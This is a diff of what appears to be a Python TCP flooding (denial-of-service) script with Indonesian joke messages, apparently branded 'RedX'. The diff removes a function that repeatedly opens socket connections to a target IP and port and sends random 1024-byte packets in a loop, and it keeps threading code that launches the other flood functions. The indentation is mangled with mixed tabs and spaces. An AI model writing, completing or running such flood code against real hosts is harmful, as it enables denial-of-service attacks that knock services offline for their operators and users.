@@ -52,21 +52,7 @@ def run2():
                 except:
                         s.close()
                         print("\033[93m Punten Goput, Yaaa gada orang")
-def run3():
-	      data = random._urandom(1024)
-      	i = random.choice(("[•]","[•]","[•]"))
-      	while True:
-	             	try:
-		                   	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		                   	s.connect((ip,port))
-		                   	s.send(data)
-		                   	for x in range(times):
-			                       	s.send(data)
-	                   		print("\033[92m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
-            		except:
-	                   		s.close()
-	                   		print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
-                  
+
                   for y in range(threads):
         if choice == 'y':
                 th = threading.Thread(target = run)
